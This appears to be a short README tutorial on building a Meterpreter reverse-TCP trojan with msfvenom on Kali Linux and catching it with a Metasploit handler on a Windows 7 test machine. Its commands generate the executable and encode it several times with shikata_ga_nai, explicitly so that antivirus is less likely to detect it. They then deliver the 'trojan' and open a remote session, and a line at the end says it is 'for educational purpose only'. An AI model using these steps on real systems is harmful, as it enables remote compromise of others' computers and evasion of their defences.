# meterpreter
this repo is for how to use meterpreter with Kali Linux 

## useful link

[Meterpreter Basiscs](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

[Unix Basics Command](https://www.unixtutorial.org/basic-unix-commands)

[Kali Linux Iso Download](https://www.kali.org/get-kali/)


## prerequisites

1- have a kali machine update with msfvenom and metasploit (native)

2- have a windows vm,it's better with windows 7

3- have the basic knowledge to use linux


## 1- Metasploit 

choose the payload with this command  `msfvenom -l payload`

with `msfvenom --list-options -p windows/meterpreter/reverse_tcp` you can see all the option for the payload chosen


## 2- Generate the payload 


You can now create an executable file from the payload :

`msfvenom -p [payload] LHOST=[your ip address] LPORT=[port number] -f [file type] > [file path]`


## 3- Encode the payload 

Since windows/meterpreter/reverse_tcp is a common exploit, most antivirus programs will detect it. However, we can encrypt the program so that an antivirus program is less likely to detect it. A long list of encoders is included with metasploit. you just have to type :  

`msfvenom -l encoders`

Once you have chosen the desired encoding (I recommend x86/shikata_ga_nai), you can encrypt it several times when you type the command to perform the exploit. Encrypting the file multiple times makes the program less susceptible to antivirus software. 

type : 

`msfvenom -p [payload] LHOST=[your ip address] LPORT=[port number] -e [encode] -i [number of applications] -f [file type] > [file path] `


## 3- send the trojan 

now that you have a .exe you can send it to your machine. to make it easier I sent it to myself via Mega but you can do it in another way.


## 4- start a Meterpreter session 

open a msfconsole with `msfconsole` in a terminal

type : 

``` 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 
```

set your lhost and lport 

``` 
set lhost [your ip address]
set lport 4444
```

and now 

`run`

when you will see `meterpreter >` your in :)

______________________________________________________________________________________________________________________________________________________________________

For educational purpose only !
